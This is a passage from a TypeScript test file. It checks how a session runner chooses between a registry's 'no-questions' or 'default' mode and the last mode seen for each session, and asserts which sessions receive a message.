    const h = harness({ registryMode: async (id: string) => (id === 's1' ? 'no-questions' : 'default') })
    await h.runner.consume(snap([row('s1', 'ls', 'none'), row('s2', 'ls', 'none')]))
    expect(h.sent).toEqual([['s1', 1]])
  })
  test('the last chip seen outranks the registry; a default-mode session is untouched', async () => {
    const h = harness({ registryMode: async () => 'no-questions' })
    await h.runner.consume(snap([idleRow('s1', 'default')]))
    await h.runner.consume(snap([row('s1', 'ls', 'none'), row('s2', 'ls', 'default')]))
    expect(h.sent).toEqual([])
    expect(h.records).toEqual([])
  })
})
